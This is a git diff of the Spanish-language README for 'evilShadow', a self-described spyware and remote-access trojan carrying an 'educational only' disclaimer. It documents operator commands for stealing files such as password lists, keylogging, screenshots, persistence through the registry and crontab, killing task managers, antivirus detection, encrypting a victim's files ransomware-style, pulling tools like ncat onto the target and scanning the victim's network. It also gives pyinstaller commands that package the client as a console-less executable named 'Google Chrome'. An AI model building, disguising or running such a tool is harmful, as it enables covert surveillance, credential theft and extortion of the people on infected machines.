@@ -1,57 +1,71 @@
 # evilShadow
 
-SpyWare. The project is currently developing…...
+RECUERDA: Este repositorio es para el aprenzidaje y educación, no me hago respondable del mal uso que se le puede dar!
 
+
+# Novedades
+
+- Escanear la red de la victima
+- Escanera puertos de host dentro de la red de la victima
+
+# Proximamente
+- Escnaeo de servicios para los puertos del host de la víctima
+- Port Forwarding (tener conexion con los otros hosts)
 
 # Functions
 (N/A) -> Not Implemented yet
 ```
                 Aviable Commands:
 
-                    | [!>] download <path>   -> Download A File From Target PC
+                    | [!>] download <path> -> Download A File From Target PC
                     ---------------------------------------------------------
-                    | [!>] downloadDir <dir> -> Download A File From Target PC
+                    | [!>] startTask       -> Monitoring & kill tasks managers
                     ---------------------------------------------------------
-                    | [!>] startTask         -> Monitoring & kill tasks managers
+                    | [!>] check           -> Check For Administrator Privileges
                     ---------------------------------------------------------
-                    | [!>] check             -> Check For Administrator Privileges
+                    | [!>] sysinfo         -> Get System Information
                     ---------------------------------------------------------
-                    | [!>] sysinfo           -> Get System Information
+                    | [!>] shell           -> Enter Shell Mode 
                     ---------------------------------------------------------
-                    | [!>] shell             -> Enter Shell Mode 
+                    | [!>] av              -> Try Detect Anti-Virus
                     ---------------------------------------------------------
-                    | [!>] av                -> Try Detect Anti-Virus
+                    | [!>] upload <path>   -> Upload local File To Target PC
                     ---------------------------------------------------------
-                    | [!>] upload <path>     -> Upload local File To Target PC
+                    | [!>] get <url>       -> Download A File To Target PC From Any Website
                     ---------------------------------------------------------
-                    | [!>] get <url>         -> Download A File To Target PC From Any Website
+                    | [!>] persistence     -> Try to get persistence (needed root)
                     ---------------------------------------------------------
-                    | [!>] persistence       -> Try to get persistence (needed root)
+                    | [!>] lowpersistence  -> Try to get persistence (no root)
                     ---------------------------------------------------------
-                    | [!>] lowpersistence    -> Try to get persistence (no root)
+                    | [!>] exec <command>  -> Exec command in no shell mode
                     ---------------------------------------------------------
-                    | [!>] exec <command>    -> Exec command in no shell mode
+                    | [!>] cryptDir <dir>  -> Crypt a full folder in target
                     ---------------------------------------------------------
-                    | [!>] cryptDir <dir>    -> Crypt a full folder in target
+                    | [!>] crypt <file>    -> Crypt a file in target
                     ---------------------------------------------------------
-                    | [!>] crypt <file>      -> Crypt a file in target
+                    | [!>] keylog_dump     -> Dump The Keystrokes From Keylogger
                     ---------------------------------------------------------
-                    | [!>] keylog_dump       -> Dump The Keystrokes From Keylogger
+                    | [!>] screenshot      -> Take a screenshot
                     ---------------------------------------------------------
-                    | [!>] screenshot        -> Take a screenshot
+                    | [!>] scannet         -> Scan all active hosts on target
                     ---------------------------------------------------------
-                    | [!>] cryptAll          -> (N/A) Close connex and crypt full system
+                    | [!>] scanhost <host> -> Scan ports on host
                     ---------------------------------------------------------
-                    | [!>] destruction       -> (N/A) Eliminate all and close conect
+                    | [!>] hosts           -> See hosts scanned with scannet
+                    ---------------------------------------------------------
+                    | [!>] cryptAll        -> (N/A) Close connex and crypt full system
+                    ---------------------------------------------------------
+                    | [!>] destruction     -> (N/A) Eliminate all and close conect
                     --------------------------------------------------------- 
-                    | [!>] q                 -> Suspend the conection
+                    | [!>] q               -> Suspend the conection
                     ---------------------------------------------------------
-                    | [!>] exit              -> Terminate the conection
+                    | [!>] exit            -> Terminate the conection
                     ---------------------------------------------------------
 ```
 
 # Detections:
 ![image](https://github.com/an0mal1a/evilShadow/assets/129337574/684c71c5-eef2-41f4-bc99-82dd05dbe260)
+
 hash: 8f361df2687c1d5ac2c9a251ab8903cea2de914305420842b566726926903b5b
 
 
@@ -84,16 +98,16 @@ Automated:
 
 Manal:
 
-- ```pip install prompt_toolkit colorama psutil cryptography requests pillow pynput pyinstaller```
+- ```pip install prompt_toolkit  colorama psutil cryptography requests pillow pynput pyinstaller```
 
 
 # Errors:
 
 - Si tenemos errores con las librerias (module not found):
-  - ```pip install prompt_toolkit colorama psutil cryptography requests pillow pynput pyinstaller``` 
+  - ```pip install prompt_toolkit  colorama psutil cryptography requests pillow pynput pyinstaller``` 
 
 
-- Si tenemos el error **"pyinstaller not found"** en el *nuevo entorno*!
+- Si tenemos el error **"pyinstaller not found"** en el **nuevo entorno**!
 
     - **Windows**
       - where pyinstaller
@@ -129,12 +143,114 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
 
   - Admin Required:
   
-      `client>pyinstaller --onefile --noupx --strip --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --noupx --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
 
   - **NO** Admin Required:
   
-      `client>pyinstaller --onefile --noupx --strip --noconsole --clean -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
 
   ### Linux:
   
-  `client>pyinstaller --onefile --noupx --strip --noconsole --clean -n "Google Chrome" conection.py`
+  `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
+
+
+# Funciones (EXPLICAIÓN)
+
+  - **Download**
+    - Con el comando "Download" podemos descargarnos archivos de la máquina remota
+      - `download /home/supervisor/Desktop/Passwords.txt`
+
+
+  - **startTask**
+    - Con este comando pones a ejecutarse la detección de adminitradores de tareas (windows/linux)
+      - ```startTask```
+
+
+  - **check**
+    - Miramos si poseemos de privilegios de administrador
+      - ``check`` 
+  
+  
+  - **sysinfo**
+    - Este comando nos devuelve informacion del sistema usando la libreria **platform** 
+        - ``sysinfo``
+
+
+  - **shell**
+    - Entramos en modo shell
+      - ``shell``
+
+
+  - **av**
+    - Detección de Anti-Virus (buscando entre procesos, se puede limitar segun el usuario que ejecuta el malware)
+      - ``av``
+  
+    
+  - **upload**
+    - Subir un archivo local a la máquina remota (recomandable: ruta completa)
+      - ``upload /home/supervisor/downloads/ncat.exe``
+ 
+   
+  - **get**
+    - Descargar archivos (binarios incluidos) de una URL
+      - ``get https://nmap.org/dist/ncat-7.94-1.x86_64.rpm``
+
+
+  - **persistence**
+    - Trata de conseguir la persistencia completa generando un servicio en linux y añadiendo en el registro de LOCAL_MACHINE en windows
+      (ROOT NEEDED / ADMIN NEEDED)
+      - ``persistence``
+
+
+  - **lowpersistence**
+    - Trata de conseguir la persistencia de usuario, en linux genera un crontab para el usuario, en windows un entrada en el registro de USER
+      - ``lowpersistence``
+
+  
+  - **exec**
+    - Ejecuta comandos en no SHELL mode
+      - `exec whoami`
+
+
+  - **cryptDir**
+    - Encripta todo el contenido de una carpeta (subcarpetas/archivos) (recomedado: ruta completa)
+      - ``cryptDir /home/pwned/project``
+
+  
+  - **crypt**
+    - Encripta 1 archivo de la victima
+      - ``crypt /home/pwned/project/index.html``
+
+
+  - **keylog_dump**
+    - Dumpea del cliente al servidor todo el keylog que se ha ido guardando
+      - ``keylog_dump``
+   
+ 
+  - **screenshot**
+    - Crea una captura de pantalla de la victima y la envia a través del socket
+      - ```screenshot```
+
+
+  - **scannet**
+    - Ejecuta un escaneo de la red local de la victima en busca de hosts activos
+      - ``scannet``
+      
+       
+  - **scanhost**
+    - Ejecuta un escaneo de puertos en el host mencionado
+      - ``scanhost 192.168.1.1``
+
+  - **hosts**
+    - Muestra los hosts detectados por *scannet*
+      - ``hosts``
+  
+
+  - **q**
+    - Suspend the connection
+      - ``q``
+
+
+  - **exit**
+    - Close the conecction
+      - ``exit``
